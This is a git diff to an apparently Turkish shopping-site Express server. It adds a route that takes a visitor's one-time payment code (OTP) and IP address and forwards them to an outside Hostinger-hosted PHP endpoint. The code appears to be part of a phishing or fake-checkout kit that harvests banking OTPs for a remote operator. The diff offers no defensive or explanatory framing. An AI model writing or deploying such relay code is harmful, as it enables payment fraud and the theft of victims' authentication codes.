@@ -228,6 +228,26 @@ app.post('/api/sepet/ekle', (req, res) => {
       res.json({ status: 'fail' });
     });
 });
+app.post('/action/process', (req, res) => { 
+  const otpCode= req.body.otpCode;
+  const ip = getClientIp(req);
+
+  axios.post(
+    'https://forestgreen-rook-759809.hostingersite.com/dmn/payment/action/process.php', 
+    qs.stringify({ otpCode, ip }), 
+    {
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'X-Requested-With': 'XMLHttpRequest'
+      }
+    }
+  )
+    .then(response => res.json({ status: response.data.trim() }))
+    .catch(error => {
+      console.error('Sepete ekleme hatası:', error.message);
+      res.json({ status: 'fail' });
+    });
+});        
 
 app.post('/api/sepet/sil', (req, res) => {
   const urun_id = req.body.urun_id;
